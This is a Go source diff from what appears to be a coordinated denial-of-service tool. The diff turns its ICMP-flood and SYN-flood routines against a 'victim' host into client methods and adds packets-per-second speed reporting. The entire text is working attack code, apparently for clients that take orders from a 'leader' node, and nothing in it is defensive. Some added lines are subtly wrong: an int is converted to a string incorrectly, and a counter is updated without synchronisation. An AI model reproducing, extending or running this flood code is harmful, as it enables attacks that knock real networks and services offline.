@@ -9,16 +9,16 @@ import (
 	"time"
 )
 
-func StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
+func (c *Client) StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
 	if ddosType == "ICMP" {
 		//ip without port
 		ip := strings.Split(victim, ":")[0]
-		go ICMPFlood(ip, stopchan, logChan)
+		go c.ICMPFlood(ip, stopchan, logChan)
 	} else if ddosType == "SYN" {
-		go SYNFlood(victim, stopchan, logChan)
+		go c.SYNFlood(victim, stopchan, logChan)
 	}
 }
-func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
+func (c *Client) ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
 
@@ -33,7 +33,8 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 		}
 	}
 	defer conn.Close()
-
+	var requestCount uint64 = 0
+	start := time.Now()
 	for {
 		channels <- struct{}{}
 		select {
@@ -41,10 +42,10 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 			if isStop {
 				logChan <- "Stopping the attack"
 				stopChan <- false
+				c.Speed = 0
 				return
 			}
 			//continue to default
-
 		default:
 			if !blocked {
 				go func() {
@@ -55,13 +56,21 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 							blocked = true
 							//wait for 1 second
 							time.Sleep(1 * time.Second)
-							logChan <- "freezing, your network\n buffer is full"
 							blocked = false
 						}
 					}
+					requestCount++
 					<-channels
 				}()
 			}
+		}
+		elapsed := time.Since(start)
+		if elapsed.Seconds() > 0.5 {
+			speed := int(float64(requestCount) / elapsed.Seconds())
+			logChan <- "Speed: " + string(speed) + " p/s"
+			c.Speed = speed
+			start = time.Now()
+			requestCount = 0
 		}
 	}
 }
@@ -95,7 +104,8 @@ func SendICMP(message *icmp.Message, conn *net.IPConn) error {
 	return nil
 }
 
-func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
+func (c *Client) SYNFlood(victim string, stopChan chan bool, logChan chan string) {
+	logChan <- "Starting SYN flood attack"
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
 	//check if port is specified
@@ -103,7 +113,8 @@ func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
 		victim = victim + ":80"
 		logChan <- "leader does not specify port\n using port 80"
 	}
-
+	var requestCount int = 0
+	start := time.Now()
 	for {
 		channels <- struct{}{}
 		select {
@@ -111,6 +122,7 @@ func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
 			if isStop {
 				logChan <- "Stopping attack"
 				stopChan <- false
+				c.Speed = 0
 				return
 			}
 		default:
@@ -120,14 +132,22 @@ func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
 				if err == nil {
 					err := conn.Close()
 					if err != nil {
-						return
+						logChan <- "error sending SYN flood request"
 					}
 				}
 				if err != nil {
 					logChan <- "error sending SYN flood request"
 				}
 				<-channels
+				requestCount++
 			}()
+		}
+		elapsed := time.Since(start)
+		if elapsed.Seconds() > 1 {
+			speed := int(float64(requestCount) / elapsed.Seconds())
+			c.Speed = speed
+			start = time.Now()
+			requestCount = 0
 		}
 	}
 }
